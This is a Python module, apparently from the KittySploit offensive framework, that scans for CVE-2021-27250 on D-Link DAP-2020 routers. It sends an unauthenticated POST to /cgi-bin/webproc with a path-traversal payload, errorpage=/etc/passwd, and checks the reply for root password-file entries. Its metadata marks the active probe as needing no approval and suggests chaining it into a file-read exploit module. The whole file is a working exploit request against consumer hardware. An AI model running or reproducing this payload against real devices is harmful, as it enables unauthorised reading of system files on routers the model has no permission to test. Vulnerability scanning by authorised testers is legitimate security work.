#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DAP-2020 webproc errorpage path traversal (CVE-2021-27250)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DAP-2020 - webproc File Read Detection (CVE-2021-27250)',
        'description': (
            'Detects CVE-2021-27250 by POSTing to /cgi-bin/webproc with errorpage=/etc/passwd '
            'and looking for passwd contents in the response.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2021', 'dlink', 'router', 'lfi',
            'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'auxiliary/admin/http/dlink_cve_2021_27250_file_read',
                ],
            },
        },
        'references': [
            'https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10201',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-27250',
        ],
        'cve': 'CVE-2021-27250',
    }

    def run(self):
        path = '/cgi-bin/webproc'
        data = (
            'getpage=html%2Findex.html&errorpage=/etc/passwd&var%3Amenu=setup&'
            'var%3Apage=wizard&var%3Alogin=true&obj-action=auth&%3Ausername=admin&'
            '%3Apassword=test&%3Aaction=login&%3Asessionid=365dfaef'
        )
        r = self.http_request(
            method='POST',
            path=path,
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if not r:
            return False
        if re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='high',
                reason='D-Link DAP-2020 webproc file read (CVE-2021-27250)',
                path=path,
            )
            return True
        return False
